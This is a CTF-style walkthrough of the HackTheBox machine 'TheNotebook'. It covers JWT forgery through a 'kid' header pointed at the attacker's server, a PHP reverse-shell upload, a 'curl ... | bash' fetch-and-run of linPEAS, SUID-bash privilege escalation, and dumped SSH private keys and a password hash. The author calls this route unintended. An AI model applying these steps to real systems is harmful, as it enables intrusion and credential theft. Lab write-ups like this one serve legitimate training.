# Before you read...

> This writeup is not correct because of someone doesn't cleared up their traces, leaving the /bin/bash binary on rwxrwxrwx permission.

> But it is my attempts and step by step in owning this machine.

> For my real writeup, check out this link on petircysec.com -> https://petircysec.com/hackthebox-thenotebook/

# NOTE >> 14/5/2021

![TheNotebook](https://cdn.discordapp.com/attachments/774604278236839956/1027403586675671070/unknown.png)

# Solving Machine "Notebook" in Hackthebox
```
1. User Flag
18009adcbc147e8a176c64cb8b4e137d

2. Root Flag
2ce94f050e34594100cbae64eaa5a36a
```

Step by step :

# 1. Do nmap on target's IP Address
```
## └─$ sudo nmap -O -A -sC -sV 10.10.10.230

[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 22:39 EDT
Nmap scan report for 10.10.10.230
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
	<o
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)    	
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)											
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
	>
10010/tcp filtered rxapi
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   255.70 ms 10.10.14.1
2   255.74 ms 10.10.10.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.14 seconds
```

# 2. Do directory bruteforcing to find if there's any hidden directory on the website.
```
## └─$ python3 dirsearch.py -u 10.10.10.230     

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /home/kali/dirsearch/reports/10.10.10.230/_21-05-14_22-40-07.txt

Error Log: /home/kali/dirsearch/logs/errors-21-05-14_22-40-07.log

Target: http://10.10.10.230/

[22:40:08] Starting: 
[22:40:40] 403 -    9B  - /admin                                                                                       
[22:41:24] 200 -    1KB - /login          <open>                                                                                       
[22:41:25] 302 -  209B  - /logout  ->  http://10.10.10.230/ 
[22:41:39] 200 -    1KB - /register       <open>                                                                 
                                                                                                                              
Task Completed
```

# 3. Check the register and login directory
```
---- Register account as usual

>> username		= wikipedia
>> password		= wikipedia
>> email		= wikipedia@gmail.com
```

then i got logged in to my account

and then i check the cookie if there's any interesting showed up
and there is!

> it's JWT Token!
<o
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Indpa2lwZWRpYSIsImVtYWlsIjoid2lraXBlZGlhQGdtYWlsLmNvbSIsImFkbWluX2NhcCI6MH0.UYzv-1bCgY4mdet0sO6hge8OiCrOve49mT9bhwPUTO5xgd4mZ8ipwpiOkZ6o2iJK7CYQovIUP7sFVQEjhm9RsT80_65-w1u2Y1vWSF-h8i0OoHWqh63ETBnOLXWsiIL2Y86yubM4N83OJh4DPu2L4F0b8eMXyqSFl4Xn4jUIetZOmagL-LMJHgbQhsj47LxwNjFJDDHPnonmyLbuYLgCCsjUfGFLPwnC_Kqvvik8iS9gnf4ZtL7Y6m0e6q9GNlMTUhitjRMl6j40zDpgiToj7Kvp8T_HpfibLLmhnwSvud3miufWnwVu8lqd33MnevTHt_pVWCr6djp0d6VLh1DmKEH_r4tAdbIxhRLcLYBXKsHC_9k9igLC5dNKefuKpZLQBksoa4xJrmzCXhelrXjT7eeUdeuoUPlZf39sIf8MeNnou33yeml9-2FngVbf12Uj5IZZqFhIEO4JuDqTEGJOQXiRs039TwYG6vebpcJTyhT3R0QO0Z0Cj_htTeH16FukJyzAZbOkLLYmviybId1Q7XUF2ZwqRuT0ECH_D3yOZKv2tf_b0my9B51N8QIEiqJzJz4WpSYxug6Zr0FnmFxsGYKHA0PByH82ai5WfEYsjY018J94igRlGXJtlkWl4GhQC7Lbjm2rTBJrsr7VIiRqnZc3GGbFzIhwYdUEooBSErU
>


# 4. Decrypt the JWT Token and modify it -> forge a new JWT Token
```
## Header
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}

## Payload
{
  "username": "wikipedia",
  "email": "wikipedia@gmail.com",
  "admin_cap": 0
}

## Verify Signature
RSASHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),

	{
		# Public Key
	}

	{
		# Private Key
	}
```

The algorithm is RSASHA256 -> meaning RSA with SHA-256 HASH Algorithm
and the signature for the JWT Token to be made is with the private and public key

because its private key is on the target's machine which is for making the public key and for now i can't reach it..
..i have to make my own private and public key in order to be accepted to modify the cookie and forge a new JWT Token

```
# Generate the Private Key
$ openssl genrsa -out rsa.private 1024
```
```
## The result for Private Key...
<o
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQC/K2gRBKEDWeMBZkbH1b9NnhLqv0wIklW6rfZAJeBZmMRfSs6k
HyA8LGIrFx/FD5VnVwXdcIOplFkEe7UJa/6TlU1hTdvVKDJGmXl0U2VQQybASBxP
TAx3bqqXyui2ePNWIjYGP1Hu+a/Hs/R/D9znoT6WpBAlcwdLGlCi7XiVSQIDAQAB
AoGBALz23hY8WiAi4MYIYBy2RzQk9ZP/ZdvvMjimLoy4I+zMmgeLvXjzn3x7bsoj
QG8c+VS963k495xPnDJXSds3Wdq3n0EnSb9snbgXnhNWBNZOrCejY6n+yvou64el
EfASP1oZXb6DMp1saSVr3L9Tz3ltntyE56c4JqKwvD5UHEqFAkEA7mUS4w8dZB1s
STCXemT+dv6sNLFX7aktTBjiu5TEr1xBUx78E8LP7Rpy3U7lKmiBCQFdQ+GMcFBW
nZGmD6p4nwJBAM1Jhlw+5Mh7sOXNqImiEoQD2u9aTNT7Es18D6fqYE1WNSK1z4q1
nPLc6Bjv7/CopG2A5dH+E8oC3oihGahc4RcCQBDzduhWRsy7mtuJbPvy+nUTnsMQ
aSQpB2OF0XltFp8xfCOg7GOrUoWVf91kor7lN2eghTUycH37+Gyz0o8CnBkCQEqJ
y9Nqsr9oyg5m4i83PenZTIFkFEmw8F7UEQszOsxZ5Ok5gqYm01oLg+qqFEEZurpX
9xqMWrsa15pchGhxcPkCQQCGwao6JsSBWBzHDbztz5qfFF2BPOBtENjVa09rlvJL
ai4GOijCJTBGtup1B037UUT0a6gYDp5/7+MZW/tBtwHH
-----END RSA PRIVATE KEY-----
> 
```
```
# Generate the Public Key
$ openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
```
```
## The result for Public Key...
<o
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/K2gRBKEDWeMBZkbH1b9NnhLq
v0wIklW6rfZAJeBZmMRfSs6kHyA8LGIrFx/FD5VnVwXdcIOplFkEe7UJa/6TlU1h
TdvVKDJGmXl0U2VQQybASBxPTAx3bqqXyui2ePNWIjYGP1Hu+a/Hs/R/D9znoT6W
pBAlcwdLGlCi7XiVSQIDAQAB
-----END PUBLIC KEY-----
>
```
Put the key on the input box in the verify signature
and after that, i could modify the cookie.

Here's the steps to modify that JWT Token -> Forging a new token in "this such case(HTB - TheNotebook)"
```
## 1. After you've generate the Private and Public Key, put those 2 on the "Verify Signature" part
## 2. Then, firstly modify the Header, the Kid one
		The Header part in JSON Web Token is the part that verify the cookie itself
		so, if you delete one from many elements that's included in that Header, the cookie won't work anymore.
		In this case, the Kid is directing the "IP Address, port and file" from the target's machine...
		.
##		"kid" : "http://localhost:7070/privKey.key
		
		Kid is a Key ID, which is in simplest way of explanation, includes some parts that verifying that JWT Token
		in this case, the Key ID have 3 parts :
			1. The IP Address
			2. Port
			3. File
		On that Key ID format, that "File" that needs to be included is a "Private Key" file.
		So the next step to do is..

## 3. Open up http server with python

		Command : python3 -m http.server 8080 (choose any port that is not used by anyone)
		-> Make sure to do this command on the directory where the private key file is exist.

		Then, the http://0.0.0.0:8080/ will show up
		
		The 0.0.0.0 is our IP Address (directing to unknown IP Address, but this is our tun0 IP Address -> HTB's VPN)
		Basically, to access our server that is being opened, you can go to "http://<Your currently-use IP Address>:8080/"
		
		Now, on the JWT Token, change the Key ID to direct to our server.
		Because we can't access the localhost of the target's machine yet, 
		we have to access to an opened IP Address or an opened server (your server).
		
		
		From the format :
			1. The IP Address 	: localhost
			2. Port 			: 7070
			3. File 			: privKey.key
		
		Change it to :
			1. The IP Address 	: 10.10.14.40 (tun0 IP)
			2. Port 			: 8080 (server's port)
			3. File 			: rsa.private

		Like this :
			{
				from :
					"kid" : "http://localhost:7070/privKey.key
				
				to :
					"kid" : "http://(your tun0 IP):(port from python http.server)/(your private key file)"

				e.g (for example) :
					"kid" : "http://10.10.14.40:8080/rsa.private"
			}

## 4. Change the Body part

	from :
		{
		  "username": "wikipedia",
		  "email": "wikipedia@gmail.com",
		  "admin_cap": false
		}

	to :
		{
		  "username": "admin",
		  "email": "wikipedia@gmail.com",
		  "admin_cap": true
		}


## 5. For final result of decoded JWT Token

======================================================================================================
+--------+
| Header |
+--------+
	{
	  "typ": "JWT",
	  "alg": "RS256",
	  "kid": "http://10.10.14.40:8080/rsa.private"
	}
======================================================================================================
+------+
| Body |
+------+
	{
	  "username": "admin",
	  "email": "wikipedia@gmail.com",
	  "admin_cap": true
	}
======================================================================================================
+------------------+
| Verify Signature |
+------------------+
RSASHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),

	RSA Public Key :
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/K2gRBKEDWeMBZkbH1b9NnhLq
v0wIklW6rfZAJeBZmMRfSs6kHyA8LGIrFx/FD5VnVwXdcIOplFkEe7UJa/6TlU1h
TdvVKDJGmXl0U2VQQybASBxPTAx3bqqXyui2ePNWIjYGP1Hu+a/Hs/R/D9znoT6W
pBAlcwdLGlCi7XiVSQIDAQAB
-----END PUBLIC KEY-----

	
	RSA Private Key :
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQC/K2gRBKEDWeMBZkbH1b9NnhLqv0wIklW6rfZAJeBZmMRfSs6k
HyA8LGIrFx/FD5VnVwXdcIOplFkEe7UJa/6TlU1hTdvVKDJGmXl0U2VQQybASBxP
TAx3bqqXyui2ePNWIjYGP1Hu+a/Hs/R/D9znoT6WpBAlcwdLGlCi7XiVSQIDAQAB
AoGBALz23hY8WiAi4MYIYBy2RzQk9ZP/ZdvvMjimLoy4I+zMmgeLvXjzn3x7bsoj
QG8c+VS963k495xPnDJXSds3Wdq3n0EnSb9snbgXnhNWBNZOrCejY6n+yvou64el
EfASP1oZXb6DMp1saSVr3L9Tz3ltntyE56c4JqKwvD5UHEqFAkEA7mUS4w8dZB1s
STCXemT+dv6sNLFX7aktTBjiu5TEr1xBUx78E8LP7Rpy3U7lKmiBCQFdQ+GMcFBW
nZGmD6p4nwJBAM1Jhlw+5Mh7sOXNqImiEoQD2u9aTNT7Es18D6fqYE1WNSK1z4q1
nPLc6Bjv7/CopG2A5dH+E8oC3oihGahc4RcCQBDzduhWRsy7mtuJbPvy+nUTnsMQ
aSQpB2OF0XltFp8xfCOg7GOrUoWVf91kor7lN2eghTUycH37+Gyz0o8CnBkCQEqJ
y9Nqsr9oyg5m4i83PenZTIFkFEmw8F7UEQszOsxZ5Ok5gqYm01oLg+qqFEEZurpX
9xqMWrsa15pchGhxcPkCQQCGwao6JsSBWBzHDbztz5qfFF2BPOBtENjVa09rlvJL
ai4GOijCJTBGtup1B037UUT0a6gYDp5/7+MZW/tBtwHH
-----END RSA PRIVATE KEY-----
======================================================================================================



## 6. Finally, copy the forged token and paste it to the Cookie section on the website, and then refresh the page
		And, you become an admin :D
```



# 5. Gaining foothold
```
# Reverse Shell in action
```
2 pages :
-> view notes
-> upload files

upload the php reverse shell on the "upload files" tab, and go get the shell

>> set up listener
>> upload the reverse shell file
>> click that file rev shell to fire the code
>> and you get a shell on your listener




# 6. Get the User flag (1st step)

(for now we can not, because we don't have the permission)
> user.txt on "noah" directory is closed to anyone, except for "noah" him self

bash-4.4$ cat user.txt
cat user.txt
cat: user.txt: Permission denied


bash-4.4$ ls -lsa user.txt
ls -lsa user.txt
4 -r-------- 1 noah noah 33 May 15 16:36 user.txt


======= Now, enumeration attempt =======
```
# First Attempt
enumerate the ARP, to list machines on the LAN
## cat /proc/net/arp

IP address       HW type     Flags       HW address            Mask     Device
172.17.0.3       0x1         0x2         02:42:ac:11:00:03     *        docker0
10.10.10.2       0x1         0x2         00:50:56:b9:f3:4f     *        ens160

Suggested to be abuse :
## looks like there's a docker instance going on




# Second attempt 
## check for rsa private key file

> trying to find if there's noah's private key shared in www-data

var -> www -> html
tmp
etc -> ssh
src
srv
dev
usr -> share
home -> noah -> ssh (permission denied)
media

> there's nothing :)





# Third attempt
## wget linpeas from my attack machine
> doesn't work -> unable to write

## uploading linpeas to "upload file" tab at admin panel
> upload success
> attempting to change mod for linpeas.sh file -> doesn't work -> don't have the permission to use chmod




# Fourth attempt
## list process history in the system

bash-4.4$ ps faux
ps faux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data 124262  0.0  0.0  34412  2984 pts/2    R+   06:15   0:00 ps faux
www-data 120108  0.0  0.0   4636   828 ?        S    05:45   0:00 sh -c uname -a
www-data 120112  0.0  0.0   4636   856 ?        S    05:45   0:00  \_ /bin/sh -i
www-data 120113  0.0  0.2  37424  9288 ?        S    05:46   0:00      \_ python
www-data 107216  0.0  0.2  37288  9360 pts/0    S+   04:12   0:00 python3 -c imp
www-data   1217  0.0  0.1 144112  7764 ?        S    May15   0:06 nginx: worker 
www-data   1216  0.0  0.2 144540  8300 ?        S    May15   0:23 nginx: worker 
www-data 107067  0.0  0.0   4636   808 ?        S    04:11   0:00 sh -c uname -a
www-data 107071  0.0  0.0   4636   828 ?        S    04:11   0:00  \_ /bin/sh -i
www-data 107141  0.0  0.2  37296  9316 ?        S    04:11   0:00      \_ python
www-data 108904  0.0  0.0      0     0 ?        Z    04:24   0:00 [sh] <defunct>

> nothing interesting :)




# Fifth attempt
## etc/ssh directory
bash-4.4$ ls -lsa
ls -lsa

#  total 596
#   4 drwxr-xr-x  2 root root   4096 Feb 12 07:33 .
#   4 drwxr-xr-x 96 root root   4096 Feb 24 08:53 ..
# 544 -rw-r--r--  1 root root 553122 Mar  4  2019 moduli
#   4 -rw-r--r--  1 root root   1580 Mar  4  2019 ssh_config
#   4 -rw-------  1 root root    668 Feb 12 06:25 ssh_host_dsa_key
#   4 -rw-r--r--  1 root root    606 Feb 12 06:25 ssh_host_dsa_key.pub
#   4 -rw-------  1 root root    227 Feb 12 06:25 ssh_host_ecdsa_key
#   4 -rw-r--r--  1 root root    178 Feb 12 06:25 ssh_host_ecdsa_key.pub
#   4 -rw-------  1 root root    411 Feb 12 06:25 ssh_host_ed25519_key
#   4 -rw-r--r--  1 root root     98 Feb 12 06:25 ssh_host_ed25519_key.pub
#   4 -rw-------  1 root root   1679 Feb 12 06:25 ssh_host_rsa_key
#   4 -rw-r--r--  1 root root    398 Feb 12 06:25 ssh_host_rsa_key.pub
#   4 -rw-r--r--  1 root root    338 Feb 12 06:18 ssh_import_id
#   4 -rw-r--r--  1 root root   3275 Feb 12 07:33 sshd_config


## ssh_host_rsa_key.pub 
> (still not sure :/)

cat ssh_host_rsa_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZwjrB05nGUvacI81YxNqy+6WpPHhIju6c73aoiru9nW/aVhTmOEsSOGoChEXeQeDN67ZN5QW4LFf0tXeQeJqvgO82HtFkUOiN8tt1RpI98SV+hx8scCzpmtAyu1OJSUM3/cL2tEPTcPHAgHTmroWiXxIMPhTFLIoDVBIqmBrORUIwgjIzFUbEDQJXKPkFciofbowVOkHnT+lv5XokU6571wrX/LRJvTNBEAvbbz0HAfvUkne8ycQsW08qk/BugiLnJHLg24YryGdHl5RqqW/42fsUADngFLncy2+/XCo8Pe/erO+7Zw6r4n1qVb0W0BZ+lRflcRss3diM/21R6O0z root@thenotebook

> This rsa pub key is for root, but i need the private one to access to root via ssh
> still haven't found if there's rsa private key for noah anywhere in this www-data





# 7. Unexpected Moment (Escalate Privilege) :/

# Sixth attempt

> Send linPeas using another command
-> immediately run linpeas upon sending the linpeas script via curl

## command = curl 10.10.14.40:9999/linPEAS.sh | bash
> have to specify bash to immediately run linpeas


## Enumeration Result

[+] Searching ssl/ssh files
PermitRootLogin yes                                                                                                                                                     
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes


[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                               
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it                                                                                        


[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                                  
srw-rw---- 1 root docker 0 May 15 16:35 /run/docker.sock



════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                 
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                           
##	-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount                                                                        
##	-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
##	-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
##	-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
##	-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
##	-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
##	-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
##	-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
##	-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
##	-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
##	-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
##	-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
##	-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
##	-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
##	-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
#	-rwsr-xr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
##	-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
##	-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
##	-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
##	-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
##	-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
#	-rwsr-xr-x 1 root   root       146K Jan 19 14:36 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
#	-rwsr-xr-x 1 root   root       111K Feb  2 08:21 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
```

WOW!!
/bin/bash on root has a Set UID Binary !!!

let's just PrivEsc and be a Root then :>
```
## Command = bash -p
```
Voila !
```
bash-4.4$
bash-4.4$ bash -p
bash -p
bash-4.4# 
```
```
bash-4.4# whoami
whoami
root
```

>> We even haven't be a Noah user !! 
>> How unexpected !!
>> We've become a Root user without touching first the Noah(User) user


```
## First, get Noah's private key -> id_rsa
<o
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
>

## And his public key (maybe ?) -> id_rsa.pub
<o
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKq5y/Po/8QRBt1/xwDjgaQSMJzdCcDKywQPeqr0/PUvEQ3TgduGEN8XEr4QNYrjKSTSDky8FByRzECzfWY2e75QKVgsxvhhca+uLAKu2sej+6XBOsvKapXPGMRstSQiCNk1bj0AHCLakN/OheeKP0kryzeKMij7D/RGofMB+BLdju35sdWjiS8gdPQhe94CK/F7PdSmK6UWRpDjOTfut8c7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
>

## And his authorized key too
<o
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKq5y/Po/8QRBt1/xwDjgaQSMJzdCcDKywQPeqr0/PUvEQ3TgduGEN8XEr4QNYrjKSTSDky8FByRzECzfWY2e75QKVgsxvhhca+uLAKu2sej+6XBOsvKapXPGMRstSQiCNk1bj0AHCLakN/OheeKP0kryzeKMij7D/RGofMB+BLdju35sdWjiS8gdPQhe94CK/F7PdSmK6UWRpDjOTfut8c7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
>

## And finally, Noah's hash
# noah:$6$fOy3f6Dp$i9.Ut7PlJpP19ZPTqmkmiRwqNunLqNEjNwq1iIeffXGi6OaDy8CtAEXXJf2SkO2fiZxuy.tWuWhsmyvl92L/W.:18670:0:99999:7:::
```

## Secondly, get Root's private key (maybe..)
<o
cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmcI6wdOZxlL2nCPNWMTasvulqTx4SI7unO92qIq7vZ1v2lYU
5jhLEjhqAoRF3kHgzeu2TeUFuCxX9LV3kHiar4DvNh7RZFDojfLbdUaSPfElfocf
LHAs6ZrQMrtTiUlDN/3C9rRD03DxwIB05q6Fol8SDD4UxSyKA1QSKpgazkVCMIIy
MxVGxA0CVyj5BXIqH26MFTpB50/pb+V6JFOue9cK1/y0Sb0zQRAL2289BwH71JJ3
vMnELFtPKpPwboIi5yRy4NuGK8hnR5eUaqlv+Nn7FAA54BS53Mtvv1wqPD3v3qzv
u2cOq+J9alW9FtAWfpUX5XEbLN3YjP9tUejtMwIDAQABAoIBAGdLsSWd/mTaP4rO
EppcRYCQxs5XLYexXmRYC6NW8KGGLyrDQe8YSnbHJ5DhQ/74ywoMHMFf5uPABqcD
cnvASks1l38IXSvDnzgdu4miC4VJiCLkq/Cyu7mEo/IxHwHQEjR/aodKu3ZFHmRw
6BhBjs1yiTFoU5PTRDTQOhQbc4a2vhLEwiD5EdQKHDTN7gBDq8NQXnDQ51SqjQiR
w5UaWLRNsDeCSn2rL373N9WU/Jxq/yLncmFH6zPq2rodErs6x7+Qk58YMny7Yv1f
20yhh4K1R2l6EZFNQir+7qfoUZvMdSi3h9v364VtLHYTu4uTZ9uDAd8KgU9PL62K
uUmJN4ECgYEAyT9W26oTS55Wmpllc97lHAB6y7asLQcroE7BGQZkzrxHaWDiHIbz
29a3xpQQtVI+pCMTXL8Tw86nE7dTrurYQvsPU2dTJSvFTH2Svzmle0fsYOolhQ7e
ZRBY03nrrAN3T4IfejBUwbCNyA8HhAQNgNCxvKCDOJqNxzkoK/BqwgMCgYEAw5da
nb2rGK2twHoAQOYp0DzKkyA0ThqrxsYeGU2TzwifoRAaaxscP8vNkTwJshjeEYlQ
puIdGduQYFraxtO1ZLAlGxqqKdmgKsNN1eLpF5OeWaFGcU2aOiTAa/6aC9C7LY23
QBOA9wM8C0aa2S9TsbYa0ZIG7onv4PhUh4Z1WRECgYA+wb6/T4Em4qCVI2LMyGRf
4BJq9nMos4S6P/Tdbe3/vhzy0qCQTtE66/FxPnkbYiNgogOGt5tdQ1M8xb2V3WxF
Lu9vjdgSzlx/ZuVdNofRMvOWoU3D+YgGshtRD0Mb6BTLuYNBYlL796evDGjGlVD0
q5/Rd6iT/TZbOwq48QcJqwKBgQC8duHk7vanX+r1dVk7L8yIj5suqzBbNg3hCdPE
0+Ch9JBEFQ0vuT6+JjYdRLme96E7SpIBTA14df2nKsR2I1c8/xGyDT579uwDaI9e
kjfB9Qb3HJSQ5pK+hd038msjCWzi1xQFVQXGfkJkJxNcROMjcPJkj43IWfdfUkm5
ERGP0QKBgQDAv5mVqbMzsgLjTpp6Z59s1PJwgXYCqHLBwQCPZQPvbiOl5ouosdd6
gUVB26hd/mq3+EoBwlHS2KCATXYh5FGIcTaNz7EtV+RtZA8+UOTWZJqQzcX+a7zV
6WFqUndSkERcnPzeg+HmCzSdhdGFOYdC6XoUW8Ic5pcjUm79tTfdQQ==
-----END RSA PRIVATE KEY-----
>





Now, let's just get the flag and finish this box :3

```
bash-4.4# cat root.txt
cat root.txt
2ce94f050e34594100cbae64eaa5a36a
bash-4.4# cd /home/noah
cd /home/noah
bash-4.4# cat user.txt
cat user.txt
18009adcbc147e8a176c64cb8b4e137d
```

